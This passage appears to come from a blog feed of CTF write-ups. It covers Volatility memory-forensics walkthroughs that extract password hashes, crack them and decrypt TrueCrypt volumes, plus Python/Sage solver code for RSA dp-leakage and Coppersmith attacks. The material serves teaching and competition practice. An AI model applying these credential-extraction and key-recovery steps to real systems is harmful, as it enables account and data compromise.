<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">		z=z+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">im.show()</span><br><span class="line">im.save(<span class="string">&#x27;Hanxin.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825161005347.png" class="" title="image-20220825161005347">

<ol start="4">
<li>稍微补充点，然后让汉信码自动校正。得到<code>flag&#123;eed70c7d-e530-49ba-ad45-80fdb7872e0a&#125;</code></li>
</ol>
<h1 id="电子数据取证-Volatility"><a href="#电子数据取证-Volatility" class="headerlink" title="电子数据取证-Volatility"></a>电子数据取证-Volatility</h1><h2 id="1-Suspicion"><a href="#1-Suspicion" class="headerlink" title="1. Suspicion"></a>1. Suspicion</h2><blockquote>
<p>解压缩得到mem.vmem suspious</p>
<p>tools：</p>
<ol>
<li>vol.py</li>
<li>Elcomsoft Forensic Disk Decryptor（EFDD）</li>
</ol>
</blockquote>
<ol>
<li>通过<code>vol.py -f mem.vmem imageinfo</code>获得基本信息</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164245671.png" class="" title="image-20220822164245671">

<ol start="2">
<li>通过<code>vol.py -f mem.vmem --profile=WinXPSP2x86 pstree</code>，得到加密进程<code>TrueCrypt.exe</code>，推断<code>suspious</code>是加密后的数据</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220822164457784.png" class="" title="image-20220822164457784">

<ol start="3">
<li>通过<code>vol.py -f mem.vmem --profile=WinXPSP2x86 memdump -p 2012 -D ./</code>（-p为PID，-D是转储路径）</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825135521302.png" class="" title="image-20220825135521302">

<ol start="4">
<li>使用<code>EFDD</code>对<code>2012.dmp</code>进行解密以及挂载。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140011253.png" class="" title="image-20220825140011253">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140028921.png" class="" title="image-20220825140028921">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140238242.png" class="" title="image-20220825140238242">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140342485.png" class="" title="image-20220825140342485">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140421572.png" class="" title="image-20220825140421572">

<p>进行挂载操作。</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140704331.png" class="" title="image-20220825140704331">

<ol start="5">
<li>查看挂载后的数据，找到<code>PCTF&#123;T2reCrypt_15_N07_S3cu2e&#125;</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825140814805.png" class="" title="image-20220825140814805">

<h2 id="2-湖湘杯2020-passwd"><a href="#2-湖湘杯2020-passwd" class="headerlink" title="2. [湖湘杯2020] passwd"></a>2. [湖湘杯2020] passwd</h2><blockquote>
<p>解压缩得到<code>WIN-BU6IJ7FI9RU-20190927-152050.raw</code></p>
<p>MD5解密</p>
</blockquote>
<ol>
<li>依旧查看基本信息<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142251600.png" class="" title="image-20220825142251600">

<ol start="2">
<li>查看hash值<code>vol.py -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142421951.png" class="" title="image-20220825142421951">

<ol start="3">
<li>使用MD5网站进行解密，得到<code>qwer1234</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825142616849.png" class="" title="image-20220825142616849">

<h2 id="3-NEWSCTF2021-very-ez-dump"><a href="#3-NEWSCTF2021-very-ez-dump" class="headerlink" title="3. [NEWSCTF2021] very-ez-dump"></a>3. [NEWSCTF2021] very-ez-dump</h2><blockquote>
<p>解压缩得到<code>mem.raw</code></p>
</blockquote>
<ol>
<li>查看镜像信息<code>vol.py -f mem.raw imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143021996.png" class="" title="image-20220825143021996">

<ol start="2">
<li>查看cmd所执行的相关命令，发现添加了一个用户<code>mumuzi</code>且密码为<code>(ljmmz)ovo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143310111.png" class="" title="image-20220825143310111">

<ol start="3">
<li>查找flag关键词<code>vol.py -f mem.raw --profile=Win7SP1x64 filescan | grep flag</code>，发现<code>flag.zip</code>进行转储<code>vol.py -f mem.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 -D ./</code>（-Q为地址，-D为转储路径）</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143446485.png" class="" title="image-20220825143446485">

<ol start="4">
<li>用<code>winhex</code>发现应该是<code>zip</code>，修改后缀名，发现压缩包进行真加密，并且需要相应的密码。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825143834446.png" class="" title="image-20220825143834446">

<ol start="5">
<li>用2中得到的密码对压缩包进行解密，最后解密得到<code>flag&#123;ez_di_imp_1t_y0u_like?&#125;</code></li>
</ol>
<h2 id="5-HDCTF2019-你能发现什么蛛丝马迹吗"><a href="#5-HDCTF2019-你能发现什么蛛丝马迹吗" class="headerlink" title="5. [HDCTF2019]你能发现什么蛛丝马迹吗"></a>5. [HDCTF2019]你能发现什么蛛丝马迹吗</h2><blockquote>
<p>解压缩得到<code>memory.img</code></p>
<p>tools：</p>
<ol>
<li>volatility</li>
</ol>
</blockquote>
<ol>
<li>正常流程，先看具体里面内容<code>vol.py -f memory.img imageinfo</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825103409801.png" class="" title="image-20220825103409801">

<p>主要使用了<code>Win2003SP</code>，根据尝试，发现<code>Win2003SP0x86</code>无法读取相关的数据，所以主要选择<code>Win2003SP1x86</code>等进行内存取证。</p>
<ol start="2">
<li>使用<code>vol.py -f memory.img --profile=Win2003SP1x86 sptree</code>查看进程。发现两个可疑进程<code>ctfmoon.exe</code>和<code>DumpIt.exe</code>,<code>ctfmoon.exe</code>进程相对久远，优先查看<code>DumpIt.exe</code>。</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825104239959.png" class="" title="image-20220825104239959">

<p><code>DumpIt.exe</code>主要是用来内存取证的工具，那主要的思路就是查看它主要做了哪些工作。</p>
<ol start="3">
<li>使用<code>screenshot</code>查看<code>vol.py -f memory.img --profile=Win2003SP1x86 screenshot --dump-dir=./</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111632586.png" class="" title="image-20220825111632586">

<ol start="4">
<li>发现了<code>flag.png</code>，此时主要查找相关的flag<code>vol.py -f memory.img --profile=Win2003SP1x86 filescan | grep flag </code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825111809842.png" class="" title="image-20220825111809842">

<ol start="5">
<li><code>vol.py -f memory.img --profile=Win2003SP1x86 dumpfiles -Q 0x000000000484f900 -D ./ -u</code></li>
</ol>
<p>把<code>flag</code>相关给导入数据，最后得到<code>00.dat</code>。</p>
<p>二维码扫一扫发现一段疑似<code>base64</code>密文。但解密没得到有用数据，于是继续从别的渠道查看。</p>
<ol start="6">
<li>查看打开了哪些软件以及具体操作<code>vol.py -f memory.img --profile=Win2003SP1x86 windows</code></li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825132746976.png" class="" title="image-20220825132746976">

<p>Pid:1992，使用图片和传真查看器查看了<code>flag.png</code>。</p>
<ol start="7">
<li><p>然后我们把这些相关数据给导出<code> vol.py -f memory.img --profile=Win2003SP1x86 memdump -p 1992 -D ./</code>，从而得到<code>1992.dmp</code></p>
</li>
<li><p>我们得到<code>1992.dmp</code>后，利用<code>foremost 1992.dmp</code>把隐藏其中的相关数据给导出</p>
</li>
</ol>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133104198.png" class="" title="image-20220825133104198">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133126952.png" class="" title="image-20220825133126952">

<p>里面发现这些图片。</p>
<p>二维码就是之前分离出来的，扫出来是<code>jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</code>，而另一张图显示<code>key:Th1s_1s_K3y00000</code>以及<code>iv:1234567890123456</code>。出现IV+密文也是base64形式。所以考虑是否进行了AES加密。</p>
<ol start="9">
<li>对密文进行AES解密，因为告诉了IV所以主要考虑是不是除了ECB以外的模式，但最终其实就是ECB模式的AES解密。（所以这一步很迷，给的IV难道就只是提示AES？）</li>
</ol>
<blockquote>
<p>AES解密：<a href="http://tool.chacuo.net/cryptaes">在线AES加密解密、AES在线加密解密、AES encryption and decryption–查错网 (chacuo.net)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20220825133644181.png" class="" title="image-20220825133644181">

<p>最后得到密文<code>flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125;</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Weekly-Descriptions-About-Crypto</title>
    <url>/2023/02/22/weekly-descriptions-about-crypto/</url>
    <content><![CDATA[<p>The <code>dp_leakage</code> in RSA attacks, the post will introduce some extensions about the <code>dp_leakage</code>, using the example <code>[2020YCB]Power</code>.</p>
<p>Next part will resolve the <code>[2022MIMIC]cry1</code> which is more easier than the former wp. The former by using <code>polynomial</code>, the latter by using <code>math deduction</code> with <code>fermat_little_theorem</code>. </p>
<p>Both of them will be given full solutions and comparison.</p>
<span id="more"></span><!--toc-->

<h1 id="DP-LEAKAGE-EXTENSIONS"><a href="#DP-LEAKAGE-EXTENSIONS" class="headerlink" title="DP_LEAKAGE_EXTENSIONS"></a>DP_LEAKAGE_EXTENSIONS</h1><h2 id="EX1-n-x3D-p-b-cdot-q"><a href="#EX1-n-x3D-p-b-cdot-q" class="headerlink" title="EX1: $n &#x3D; p^{b}\cdot q$"></a>EX1: $n &#x3D; p^{b}\cdot q$</h2><blockquote>
<p>[2020YCB]Power</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/hense_lifting.png" class="" title="hense_lifting">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return: m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>

<h2 id="EX2-Coppersmith-attack-know-dp-high"><a href="#EX2-Coppersmith-attack-know-dp-high" class="headerlink" title="EX2: Coppersmith attack, know dp high"></a>EX2: Coppersmith attack, know dp high</h2><blockquote>
<p>[qwb2019]Coppersmith</p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/coppersmith-high.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Sage</span><br><span class="line">dp0 = </span><br><span class="line">e = </span><br><span class="line">n = </span><br><span class="line"></span><br><span class="line">F.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">d = inverse_mod(e, n)</span><br><span class="line">for k in range(1, e):</span><br><span class="line">	f = (secret &lt;&lt; 200) + x + (k - 1) * d # 200 editable</span><br><span class="line">	x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32)</span><br><span class="line">	if len(x0) != 0:</span><br><span class="line">		dp = x0[0] + (secret &lt;&lt; 200)</span><br><span class="line">		for i in range(2, e):</span><br><span class="line">			p = (e * Integer(dp) - 1 + i) // i</span><br><span class="line">			if n % p == 0:</span><br><span class="line">				break</span><br><span class="line">		if p &lt; 0:</span><br><span class="line">			continue</span><br><span class="line">		else:</span><br><span class="line">			print(&#x27;k = &#x27;,k)</span><br><span class="line">			print(&#x27;p = &#x27;,p)</span><br><span class="line">			print(&#x27;dp = &#x27;,dp)</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>

<h2 id="EX3-p-x3D-gcd-m-e-cdot-dp-m-n"><a href="#EX3-p-x3D-gcd-m-e-cdot-dp-m-n" class="headerlink" title="EX3: $p &#x3D; gcd(m^{e\cdot dp} - m, n)$"></a>EX3: $p &#x3D; gcd(m^{e\cdot dp} - m, n)$</h2><img src="/2023/02/22/weekly-descriptions-about-crypto/gcd.png" class="">

<h2 id="TBC"><a href="#TBC" class="headerlink" title="TBC"></a>TBC</h2><h1 id="2020YCB-Power"><a href="#2020YCB-Power" class="headerlink" title="[2020YCB]Power"></a>[2020YCB]Power</h1><p><a href="weekly-descriptions-about-crypto/Power.py">Power.py</a></p>
<h2 id="factorize-n-to-get-p"><a href="#factorize-n-to-get-p" class="headerlink" title="factorize $n$ to get $p$"></a>factorize $n$ to get $p$</h2><h3 id="solution1-limit"><a href="#solution1-limit" class="headerlink" title="solution1-limit"></a>solution1-limit</h3><p><strong>Use the bit_length of $p$ to limit.</strong> We can get the equation of $num &#x3D; dp \times e - 1$, and the num’s bit_length is 526, meaning that num contains some excess factors. We divide these small factors and we will get the true $p$, whose bit_length is 512. </p>
<p>We use <code>yafu</code> to make a factorization. </p>
<p><strong>Deduction:</strong><br>$$<br>\varphi(n) &#x3D; lcm(p-1, q-1) &#x3D; k_1(p-1) \cdot k_2(q-1)<br>$$</p>
<p>$$<br>d \times e \equiv 1 \mod \varphi(n) \equiv 1 \mod (p-1)<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>\Longrightarrow dp\times e \equiv 1 \mod (p-1)<br>$$</p>
<p>Meaning that $num &#x3D; dp \times e - 1 &#x3D; k(p-1)$, we limit the bit_length to 512, and we will get the key equation of $p &#x3D; num + 1$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">factor:</span></span><br><span class="line"><span class="string">P1 = 2 # 1 digits</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P1 = 2</span></span><br><span class="line"><span class="string">P2 = 11 # 2</span></span><br><span class="line"><span class="string">P4 = 7411 # 4</span></span><br><span class="line"><span class="string">P14 = 10402958442703 # 14</span></span><br><span class="line"><span class="string">P17 = 25388174482857437 # 17</span></span><br><span class="line"><span class="string">P23 = 19976951634728916570101 # 23</span></span><br><span class="line"><span class="string">P33 = 121098273308863403811867260913043 # 33</span></span><br><span class="line"><span class="string">P69 = 514664028984426592785192432611128951474323755859087258008037664208623 # 69</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = num // <span class="number">7411</span> // <span class="number">2</span> // <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"><span class="comment"># judgement conditions</span></span><br><span class="line"><span class="comment"># 1. the bit_length 512 ?</span></span><br><span class="line"><span class="comment"># 2. p is prime ?</span></span><br></pre></td></tr></table></figure>

<h3 id="solution2-root"><a href="#solution2-root" class="headerlink" title="solution2-root"></a>solution2-root</h3><p><strong>Use the equation of $x &#x3D; 2019\times p^{2} + 2020\times p^{3} + 2021\times p^{4}$ ,  which is given by <code>Power.py</code> .</strong>  We can also see clearly from the <code>Power.py</code> that it use <code>discrete log</code> to generate $g_1$, by using $x, y, g$.</p>
<p>So the steps to solve $p$: </p>
<ul>
<li><strong><code>discrete_log(y, c1, g)</code> to solve out $x$</strong> (more important)</li>
<li><code>equations</code> to solve out $p$, the root of the equation is $p$</li>
</ul>
<p><em>The real $p$ is defined in $GF(y)$</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># step1</span><br><span class="line">x = discrete_log(y, c1, g)</span><br><span class="line"># x =</span><br><span class="line"></span><br><span class="line"># step2</span><br><span class="line">p = var(&#x27;p&#x27;)</span><br><span class="line">R.&lt;p&gt; = PolynomialRing(GF(y))</span><br><span class="line">f = 2019*p**2 + 2020*p**3 + 2021*p**4 - x</span><br><span class="line">f.roots()</span><br><span class="line"># p = </span><br></pre></td></tr></table></figure>

<h3 id="solution3-crack"><a href="#solution3-crack" class="headerlink" title="solution3-crack"></a>solution3-crack</h3><p>Just crack by using the $dp, e, x, y, c1$. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%x==<span class="number">0</span>:</span><br><span class="line">        p=(dp*e-<span class="number">1</span>)//x+<span class="number">1</span></span><br><span class="line">        x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> c1 == <span class="built_in">pow</span>(g, x, y):</span><br><span class="line">            <span class="built_in">print</span>(p)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="solve-out-m"><a href="#solve-out-m" class="headerlink" title="solve out $m$"></a>solve out $m$</h2><h3 id="solution1-deduce"><a href="#solution1-deduce" class="headerlink" title="solution1-deduce"></a>solution1-deduce</h3><p><strong>Use <code>fermat_little_theorem</code> to deduce.</strong> From the definition of $c$.<br>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>dp \equiv d \mod (p-1)<br>$$</p>
<p>$$<br>\rightarrow c^{dp} \equiv m^{dp \cdot e}\mod n<br>$$</p>
<p>$$<br>\Longrightarrow \exists k \in \mathbb{Z}, c^{dp}\mod p &#x3D; m^{k\cdot (p-1) + 1} \mod p<br>$$</p>
<p><code>Fermat&#39;s little theorem</code> can get the equation of $m^{\varphi(p)}\mod p \equiv 1$.<br>$$<br>\Longrightarrow m \cdot m^{k\cdot(p-1)}\mod p \equiv c^{dp} \mod p<br>$$</p>
<p>$$<br>\Longrightarrow m \equiv c^{dp} \mod p<br>$$</p>
<p>So we can run this easy code to get $m$.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">pow</span>(c, dp, p)</span><br></pre></td></tr></table></figure>

<h3 id="solution2-hensel"><a href="#solution2-hensel" class="headerlink" title="solution2-hensel"></a>solution2-hensel</h3><p><strong>The $n &#x3D; p^{4}\times q$</strong>, which is satisfied the <code>hensel_lifting scheme</code>. The $b$ is 4. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">int</span>(dp_hensel(c, e, dp, p, b))</span><br></pre></td></tr></table></figure>

<p>Over~</p>
<h1 id="2022MIMIC-cry1"><a href="#2022MIMIC-cry1" class="headerlink" title="[2022MIMIC]cry1"></a>[2022MIMIC]cry1</h1><p><a href="weekly-descriptions-about-crypto/cry1.py">cry1.py</a></p>
<blockquote>
<p>references: </p>
<ul>
<li>V&amp;N2020 Fast</li>
<li>REDHAT2019 Related</li>
</ul>
</blockquote>
<h2 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h2><p>To solve out the $p$ and $q$, we ought to make a deduction about the encrypt code. </p>
<p><strong>Known:</strong><br>$$<br>g_1 &#x3D; g^{(p-1) \cdot r_1}\mod p<br>$$</p>
<p>$$<br>c_1 \equiv (m \times g_1^{s_1} \mod N )\mod N<br>$$</p>
<p><strong>Deduction:</strong> <code>fermat_little_theorem</code><br>$$<br>g_1 &#x3D; g^{(p-1)\cdot r1} \mod p \equiv 1<br>$$</p>
<p>$$<br>\Longrightarrow g_1 - 1 &#x3D; k\cdot p<br>$$</p>
<p>The $N &#x3D; p\times q$, thus we can get $p$ by $gcd(g_1-1, N)$. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = gcd(g1 - <span class="number">1</span>, N)</span><br><span class="line">q = N // p</span><br></pre></td></tr></table></figure>

<h3 id="solution1-crt"><a href="#solution1-crt" class="headerlink" title="solution1-crt"></a>solution1-crt</h3><p>Write the decrypt code by using <code>chinese_remainder_theorem</code>. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c1, c2, p, q</span>):</span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp*invert(q, p)*q + xq*invert(p, q)*p) % (p*q)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="comment"># or sagemath-crt()</span></span><br><span class="line">m = crt([c1, c2], [p, q])</span><br></pre></td></tr></table></figure>

<h3 id="solution2-min"><a href="#solution2-min" class="headerlink" title="solution2-min"></a>solution2-min</h3><p>$$<br>c_1 \equiv (m \times g^{s_1 \cdot r_1  \cdot (p-1)} \mod p) \mod N\<br>\Longrightarrow c_1 \equiv m \mod N<br>$$</p>
<p>By equation above, we can get a simple way to solve out $m$, for that the bit_length of $m$ is short theoretically.<br>$$<br>m &#x3D; min(c1 \mod p, c1 \mod q)<br>$$<br>Convert to code.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = min(c1 % p, c1 % q)</span><br></pre></td></tr></table></figure>

<h2 id="part2"><a href="#part2" class="headerlink" title="part2"></a>part2</h2><p>Three equations of <code>A</code>, <code>B</code>, <code>C</code>. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line">A = [(i + <span class="number">128</span>)**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">B = [(i + <span class="number">1024</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">C = [(i + <span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br></pre></td></tr></table></figure>



<h3 id="solution1-Groebner-basis"><a href="#solution1-Groebner-basis" class="headerlink" title="solution1-Groebner_basis"></a>solution1-Groebner_basis</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PR = PolynomialRing(Zmod(N2), <span class="string">&#x27;x&#x27;</span>, cnt)</span><br><span class="line">x = PR.gens()</span><br><span class="line">Fs = [((A[i] * x[i]**<span class="number">2</span> + B[i] * x[i] + C[i])**e - Cs[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line">Fs.append(x[<span class="number">0</span>] + x[<span class="number">1</span>] + x[<span class="number">2</span>] - S)</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">G_b = I.groebner_basis()</span><br><span class="line">m2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G_b[:-<span class="number">1</span>]:</span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    mi = <span class="built_in">hex</span>(mi)[<span class="number">2</span>:].strip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    m2 += ((<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)[<span class="built_in">len</span>(mi) %<span class="number">2</span>]+mi)</span><br><span class="line"><span class="comment"># m is hex</span></span><br></pre></td></tr></table></figure>

<p>TBC~</p>
<h3 id="solution2-functions"><a href="#solution2-functions" class="headerlink" title="solution2-functions"></a>solution2-functions</h3><p>We are similar to the polynomial equations, thus we make a conversion. </p>
<p>Get the quadradic equations by open to the power of e.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">C_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Cs:</span><br><span class="line">    C_.append(iroot(i, Cs)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>Unknown variables  $m1, m2, m3$defined on the ring of $\mathbb{Z}$ .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;m1&gt; = Zmod()[]</span><br><span class="line">P.&lt;m2&gt; = Zmod()[]</span><br><span class="line">P.&lt;m3&gt; = Zmod()[]</span><br></pre></td></tr></table></figure>

<p>Substitute the former equations, and get the quadradic equations. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f1 = A[<span class="number">0</span>] * m1 ** <span class="number">2</span> + B[<span class="number">0</span>] * m1 + C[<span class="number">0</span>] - <span class="built_in">int</span>(C_[<span class="number">0</span>])</span><br><span class="line">f2 = A[<span class="number">1</span>] * m2 ** <span class="number">2</span> + B[<span class="number">1</span>] * m2 + C[<span class="number">1</span>] - <span class="built_in">int</span>(C_[<span class="number">1</span>])</span><br><span class="line">f3 = A[<span class="number">2</span>] * m3 ** <span class="number">2</span> + B[<span class="number">2</span>] * m3 + C[<span class="number">2</span>] - <span class="built_in">int</span>(C_[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>

<p>Get the root. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v1 = f1.roots()</span><br><span class="line">v2 = f2.roots()</span><br><span class="line">v3 = f3.roots()</span><br></pre></td></tr></table></figure>





<h1 id="coppersmith边界问题"><a href="#coppersmith边界问题" class="headerlink" title="coppersmith边界问题"></a>coppersmith边界问题</h1><blockquote>
<p><a href="https://blog.csdn.net/qq_51999772/article/details/123620932">RSA中coppersmith定理的应用条件_small_roots_M3ng@L的博客-CSDN博客</a></p>
</blockquote>
<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144033492.png" class="" title="image-20230803144033492">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144106079.png" class="" title="image-20230803144106079">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144137890.png" class="" title="image-20230803144137890">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144155489.png" class="" title="image-20230803144155489">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144224670.png" class="" title="image-20230803144224670">

<img src="/2023/02/22/weekly-descriptions-about-crypto/image-20230803144334288.png" class="" title="image-20230803144334288">



<ul>
<li><p>在<code>sagemath</code>中应用<code>coppersmith</code>定理的函数有两个：<code>small_roots</code>， <code>coppersmith_howgrave_univariate</code>。</p>
</li>
<li><p>这里求解coppersmith我们统一使用sagemath的<code>small_roots()</code>函数；该函数导入的 $\beta$起作用的只有一位小数（如果是两位小数，其求解范围还是相当于一位小数的求解范围），这就意味着一般形如<code>p = getPrime(bits)</code>,<code>q = geyPrime(bits)</code>的RSA应用<code>coppersmith</code>求解$p$的低位时，$\beta$只能是最接近$0.5$ 的$0.4$。</p>
</li>
</ul>
<p>关于<code>small_roots()</code>的使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">small_roots(X = ,beta = ) 有两个参数</span><br></pre></td></tr></table></figure>

<p>$X$代表所需要求解根的上限；虽然是根的上限，并不是说上限越高越好，当上限超过某个值的时候就会计算失效，即使已知二进制位数满足条件，也无法用此函数求得结果；所以一般来说$X$取在给定情况下的最大求解上限。</p>
<p>$beta$即是前面提到的$\beta$ ，当$p$,$q$二进制位数相同时一般只能取$0.4$；如果$p$,$q$二进制位数不同，就按照之前的方法具体问题具体分析。</p>
<p>经过测试得到，当未知量小于等于$454bits$时（$p$,$q$为$1024bits$），coppersmith定理可以求解</p>
<p>之后改变了$p$,$q$的大小，经过测试发现，当$p$,$q$同二进制位数时，要使用<code>small_roots()</code>应用<code>coppersmith</code>定理求解$n$的某个因数的低位，需要满足未知的二进制位数与因数之间的二进制位数的关系是：<br>$$<br>bits_{unknown} \div bits_{p} &lt; &#x3D; 0.44<br>$$</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>fermat_little_theorem</tag>
        <tag>dp_leakage</tag>
        <tag>YCB</tag>
        <tag>MIMIC</tag>
        <tag>chinese_remainder_theorem</tag>
        <tag>Groebner_basis</tag>
      </tags>
  </entry>
  <entry>
    <title>LLL&#39;s Notes Study</title>
    <url>/2023/09/18/LLL-s-notes-Study/</url>
    <content><![CDATA[<span id="more"></span><!--toc-->
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>LLL</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows11安装wsl2以及sagemath</title>
    <url>/2024/03/19/Windows11%E5%AE%89%E8%A3%85wsl2%E4%BB%A5%E5%8F%8Asagemath/</url>
    <content><![CDATA[<p>本文章主要介绍如何使用wsl2安装sagemath，实际安装的过程中出现一些问题，将基于遇到的问题来补充对应的解决方式。</p>
<span id="more"></span><!--toc-->
<blockquote>
<p><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install">https://learn.microsoft.com/zh-cn/windows/wsl/install</a><br>
<a href="https://zhuanlan.zhihu.com/p/633782050">https://zhuanlan.zhihu.com/p/633782050</a><br>
